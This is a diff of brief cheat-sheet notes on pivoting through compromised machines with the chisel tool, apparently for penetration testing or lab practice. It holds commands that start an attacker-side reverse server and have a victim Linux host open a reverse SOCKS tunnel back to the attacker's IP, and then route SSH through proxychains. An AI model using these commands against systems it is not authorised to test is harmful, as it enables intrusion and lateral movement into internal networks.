@@ -1,15 +1,11 @@
+Reference: https://ap3x.github.io/posts/pivoting-with-chisel/
+
 ## Attacker Server
-./chisel_1.9.1_linux_amd64 server -p 8001 --reverse -v --keepalive 5s
+./chisel_1.9.1_linux_amd64 server -p 8001 --reverse
 
 ## Machine 1 (Linux)
-chisel client 192.168.1.72 8001 --reverse R:socks:2000
+chisel client 192.168.1.72 8001 --reverse R:socks:1080
 vi /etc/proxychains4.conf # Change socks and port to match socks port.
-
-## Machine 2 (Windows)
-chisel client 192.168.1.72 8001 --reverse R:socks:2001
-
-## Machine 3 (Debian)
-chisel client 192.168.1.72 8001 --reverse R:socks:2002
 
 ## Attacker Machine
 proxychains ssh
